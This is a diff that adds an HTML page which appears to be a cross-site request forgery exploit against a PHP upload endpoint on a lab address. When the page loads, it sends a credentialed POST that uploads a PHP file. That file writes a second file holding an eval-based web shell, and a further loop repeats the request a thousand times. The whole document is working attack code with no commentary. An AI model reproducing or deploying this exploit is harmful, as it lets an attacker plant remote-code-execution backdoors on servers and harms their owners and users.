@@ -1,0 +1,42 @@
+<html>
+    <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://172.17.0.2/upload.php?"+Math.random(), true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en,zh-CN;q=0.9,zh;q=0.8");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryfJEbEkHoV22zBdaM");
+        xhr.withCredentials = "true";
+        var body = "------WebKitFormBoundaryfJEbEkHoV22zBdaM\r\n" +
+          "Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\n" +
+          "Content-Type: application/x-php\r\n" +
+          "\r\n" +
+          "<?php file_put_contents('a.php', '<?php eval($_GET[1]);?>');?>\r\n" +
+          "\r\n" +
+          "------WebKitFormBoundaryfJEbEkHoV22zBdaM\r\n" +
+          "Content-Disposition: form-data; name=\"flid\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "------WebKitFormBoundaryfJEbEkHoV22zBdaM\r\n" +
+          "Content-Disposition: form-data; name=\"submit\"\r\n" +
+          "\r\n" +
+          "上传\r\n" +
+          "------WebKitFormBoundaryfJEbEkHoV22zBdaM--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+<script>
+	var html = '';
+	for(var k=0; k<1000; k++){
+		html = html + '<script>submitRequest();<\/script>';
+	}
+	document.write(html);
+</script>
+  </body>
+</html>
